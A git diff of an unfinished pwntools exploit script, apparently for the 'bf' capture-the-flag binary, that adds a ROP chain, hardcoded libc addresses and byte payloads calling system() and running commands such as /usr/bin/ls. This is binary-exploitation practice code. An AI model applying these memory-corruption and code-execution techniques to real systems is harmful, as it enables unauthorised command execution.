@@ -10,7 +10,8 @@ exe = ELF("./bf")
 
 # Libc
 libc = exe.libc
-libc_base = 0xf7e0a000
+#libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb 
+libc_base = 0xf7e0a000 # TODO - re-adjust base - I changed it cuz of gdb 
 libc.address = libc_base
 puts_addr = p32(next(libc.search(b"puts")))
 #execve_addr = p32(next(libc.search(b"libc_system")))
@@ -21,8 +22,20 @@ puts_plt = p32(exe.plt['puts'])
 print(f"sh_addr: {hex(sh_addr)}")
 #print(f"puts plt: {puts_plt}")
 
+rop = ROP(libc)
+rop_addr = rop.eax.address
+#rop.execve(sh_addr,0,0)
+my_rop = b'p\xb3\xec\xf7baaa\n\x00\x00\x00' # sleep 10
+my_rop = b'\xc0\xb8\xec\xf7baaa+k\xf7\xf7\x10\x00\x00\x00/usr/bin/ls\x00' #ls
+print(f"ROP: {bytes(rop)}")
+print(f"DUMP: {rop.dump()}")
 # Start process
-conn = process("./bf") # local file
+conn = process("./bf")
+#conn = gdb.debug("./bf",
+#env={"LD_PRELOAD":"./libc.so.6"}, gdbscript='''
+#br *0x8048717
+#'''
+#)
 
 with open("payload", "w") as f:
     f.write("")
@@ -40,7 +53,13 @@ with open("payload", "w+") as f:
     f.write(payload)
 # separate sends cuz of annoying encoding / decoding issue with p32() and
 # strings
-payload = p32(0xf7e55db0) # system()
+#pop_eax_address = libc_base + 0x0002407e
+pop_eax_address = my_rop
+#print(f" POP: {hex(pop_eax_address)}")
+#payload = p32(pop_eax_address) # pop eax  - I might need to call it like 0x128
+payload = b''
+#payload = my_rop # pop eax  - I might need to call it like 0x128
+payload += p32(0xf7e55db0) # system()
 payload +=b"\n"
 conn.send(payload)
 with open("payload", "ab+") as f:
